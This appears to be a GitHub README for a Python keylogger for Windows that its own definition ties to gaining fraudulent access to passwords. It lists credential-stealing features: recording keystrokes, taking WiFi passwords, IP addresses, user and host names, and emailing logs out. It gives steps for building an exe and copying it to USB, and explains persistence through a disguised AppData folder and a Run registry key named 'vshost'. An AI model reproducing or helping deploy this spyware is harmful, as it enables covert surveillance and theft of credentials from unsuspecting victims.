# Keylogger_windows

* a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information. 
* keylogger use pynput 
* written by python 3.7 

## required
###  compile to exe file install 
* pip install pynput==1.6.8 "'this is good for compile to exe '"
* pip install py2exe
* link py2exe
* https://www.py2exe.org/

## features:-

* handle the backspace key
* handle the Caps Lock key
* run in background
* send email attached log file 
* grep public IP 
* grep local IP
* grep user name
* grep host name
* grep ssid name and WIFI password

### logfile

 <img src = "images/6.png" width=550>
 
##  how to use    :-
### complie to exe file execute

* go to link 
* https://www.github.com/jac11/keylogger_windows.git
* downlod the code zipfile
* unziped the file 
* open cmd from same dir
* make sure add python to Environment Variables
* run this command 'python setup.py py2exe'
* make sure the file setup.py at same dir to make compli succeeded 
* after compli you will get the folder dist have the  exe file execute at same dir 
* copy folder dist to USB ready to use 
<img src ="images/1.png" width=350><img src ="images/2.png" width=350><img src ="images/3.png" width=350>

### run exe file: -

* run the exe file as normal way 
* exe file will copy all dll file and exe file to the folder in %dataapp% 'Roaming' under the name FVHost folder 
* code will add key in the regdster this path 'Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'  to run as startup service 
the key name is 'vshost'
* log file under the name 'VHost' in roaming

<img src = "images/4.png" width=350> <img src = "images/5.png" width=350>

